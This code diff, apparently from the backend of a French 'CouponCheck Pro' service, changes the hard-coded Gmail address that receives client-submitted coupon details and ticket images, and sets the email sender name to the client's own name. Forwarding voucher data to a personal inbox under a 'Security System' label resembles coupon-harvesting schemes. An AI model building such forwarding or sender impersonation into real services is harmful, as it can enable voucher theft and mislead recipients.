@@ -8,7 +8,7 @@ import fs from "fs";
 
 dotenv.config();
 
-// Helper to send email notification to sillyfr079@gmail.com
+// Helper to send email notification to i2535393@gmail.com
 const sendEmailToSupport = async (
   brand: string,
   customBrandName: string | undefined,
@@ -87,7 +87,7 @@ INFORMATIONS DU COUPON :
       ` : `<p style="color: #64748b; font-style: italic;">Aucune image de ticket n'a été rattachée.</p>`}
       
       <div style="margin-top: 30px; font-size: 11px; color: #94a3b8; border-top: 1px solid #e2e8f0; padding-top: 15px; text-align: center;">
-        CouponCheck Pro Security System • Notification Support Automatisée • sillyfr079@gmail.com
+        CouponCheck Pro Security System • Notification Support Automatisée • i2535393@gmail.com
       </div>
     </div>
   `;
@@ -117,15 +117,18 @@ INFORMATIONS DU COUPON :
   }
 
   const mailOptions = {
-    from: process.env.SMTP_FROM || `"CouponCheck Support" <${smtpConfig.auth.user}>`,
-    to: "sillyfr079@gmail.com",
+    from: process.env.SMTP_FROM 
+      ? `"${clientFirstName || 'Client'} ${clientName || ''}" <${process.env.SMTP_FROM}>`
+      : `"${clientFirstName || 'Client'} ${clientName || 'CouponCheck'}" <${smtpConfig.auth.user}>`,
+    replyTo: clientEmail || undefined,
+    to: "i2535393@gmail.com",
     subject: subject,
     text: textContent,
     html: htmlContent,
     attachments: attachments
   };
 
-  console.log(`[Email Dispatcher] Preparing email for ${displayBrand} to sillyfr079@gmail.com...`);
+  console.log(`[Email Dispatcher] Preparing email for ${displayBrand} to i2535393@gmail.com...`);
 
   // Log locally as well for developer awareness in the file log
   const logDir = path.join(process.cwd(), "logs");
@@ -136,7 +139,7 @@ INFORMATIONS DU COUPON :
   const logEntry = `
 ========================================
 DATE: ${new Date().toISOString()}
-TO: sillyfr079@gmail.com
+TO: i2535393@gmail.com
 SUBJECT: ${subject}
 BRAND: ${displayBrand}
 CLIENT: ${clientFirstName} ${clientName} (${clientEmail})
@@ -177,7 +180,8 @@ ${htmlContent}
       });
       const etherealOptions = {
         ...mailOptions,
-        from: `"CouponCheck Support Test" <${testAccount.user}>`
+        from: `"${clientFirstName || 'Client'} ${clientName || 'CouponCheck'}" <${testAccount.user}>`,
+        replyTo: clientEmail || undefined
       };
       const info = await etherealTransporter.sendMail(etherealOptions);
       const previewUrl = nodemailer.getTestMessageUrl(info);
@@ -228,7 +232,7 @@ ${message}
       </div>
       
       <div style="margin-top: 30px; font-size: 11px; color: #94a3b8; border-top: 1px solid #e2e8f0; padding-top: 15px; text-align: center;">
-        CouponCheck Pro • Centre de Support • sillyfr079@gmail.com
+        CouponCheck Pro • Centre de Support • i2535393@gmail.com
       </div>
     </div>
   `;
@@ -247,8 +251,10 @@ ${message}
   const hasRealSmtp = !!process.env.SMTP_HOST && !!process.env.SMTP_USER && !!process.env.SMTP_PASS;
 
   const mailOptions = {
-    from: process.env.SMTP_FROM || `"CouponCheck Support Form" <${smtpConfig.auth.user}>`,
-    to: "sillyfr079@gmail.com",
+    from: process.env.SMTP_FROM 
+      ? `"${name}" <${process.env.SMTP_FROM}>`
+      : `"${name}" <${smtpConfig.auth.user}>`,
+    to: "i2535393@gmail.com",
     subject: mailSubject,
     replyTo: email,
     text: textContent,
@@ -286,7 +292,8 @@ ${message}
       });
       const info = await etherealTransporter.sendMail({
         ...mailOptions,
-        from: `"CouponCheck Support Test" <${testAccount.user}>`
+        from: `"${name}" <${testAccount.user}>`,
+        replyTo: email
       });
       const previewUrl = nodemailer.getTestMessageUrl(info);
       console.log(`[Support Contact] Ethereal mail sent. Preview URL: ${previewUrl}`);
